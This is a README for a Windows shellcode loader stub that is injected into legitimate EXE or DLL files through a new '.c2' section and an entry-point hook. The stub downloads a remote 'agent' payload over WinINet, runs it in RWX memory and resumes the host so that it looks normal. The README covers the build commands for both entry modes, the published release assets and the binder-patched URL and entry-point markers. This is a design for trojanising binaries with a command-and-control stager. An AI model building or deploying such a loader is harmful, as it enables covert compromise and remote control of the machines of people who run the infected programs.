# native-loader

Position-independent Windows loader **stub**, injected into a host PE.

The stub is a small freestanding C program compiled to flat position-independent
shellcode. Injected into a host EXE/DLL (new `.c2` section + entry-point hook), it:

1. Resolves `kernel32` and its APIs via a PEB/Ldr walk — **no imports, no CRT**.
2. Spawns a background thread that downloads the Position-Independent-Agent (PIA)
   `.bin` from a patched URL over WinINet and runs it in memory
   (`VirtualAlloc` RWX + call).
3. Resumes the host's original entry point, so the legit binary runs normally.

## Build

```sh
./build.sh     # builds both entry modes → dist/stub-x64-{exe,dll}.bin
```

`build.sh` is the canonical build (CI uses it too). It verifies position
independence (PC-relative relocations only) and gates each flat binary on
containing exactly one of each binder marker. Requires `gcc-mingw-w64-x86-64`.

Pick one entry-point mode via a `-D` flag:

- `-DBUILD_FOR_DLL` — the stub is wired in as the host **DLL's** `DllMain`
  (`hinstDLL` is the image base; the stager thread fires on
  `DLL_PROCESS_ATTACH`, then the original `DllMain` is resumed).
- `-DBUILD_FOR_EXE` — the stub replaces the host **EXE's** entry point (no
  base argument; the base is derived from the PEB at runtime, then the original
  entry point is resumed).

Equivalent one-mode commands:

```sh
MODE=dll   # or: exe

x86_64-w64-mingw32-gcc -c -O2 -ffreestanding -nostdlib -fno-stack-protector \
                -fno-asynchronous-unwind-tables -fno-unwind-tables \
                -DBUILD_FOR_$(echo $MODE | tr a-z A-Z) -e _start stub/stub.c -o stub.o
x86_64-w64-mingw32-ld -T stub/stub.ld --entry=_start -o stub.pe stub.o
x86_64-w64-mingw32-objcopy -O binary stub.pe stub-x64-$MODE.bin
```

> **x86 (32-bit) target**: the source compiles for x86 (pointer width and calling
> conventions are selected by `__x86_64__`), but PIC shellcode from C needs
> RIP-relative addressing, which x86 lacks. The x86 variant therefore is not
> position-independent and is not published; only the x64 blobs are shipped.

## Release asset contract

The rolling **`preview`** release publishes:

| Asset | Arch | Notes |
|-------|------|-------|
| `stub-x64-dll.bin` | x86_64 | flat PIC shellcode; DLL/`DllMain` entry at byte 0 |
| `stub-x64-exe.bin` | x86_64 | flat PIC shellcode; EXE entry at byte 0 |

## Binder-patched fields (ASCII-findable by the shared `LoaderUrlPatcher`)

- `SHELLCODE_URL_PLACEHOLDER` — 256-byte slot; the agent URL is written here (UTF-8, zero-padded).
- `C2OEPRAV` — 8-byte ASCII marker; the host's original entry-point RVA (uint32
  LE) is written into the marker's bytes at offset +4 (overwriting the `PRAV`
  half). Read back with `volatile` at runtime so `-O2` can't fold it away.

At runtime the stub reads the URL from `g_url` and the OEP RVA from the
`C2OEPRAV` marker, then resumes the host at `module_base + oep` (ASLR-safe — the
base is derived from the PEB at runtime).
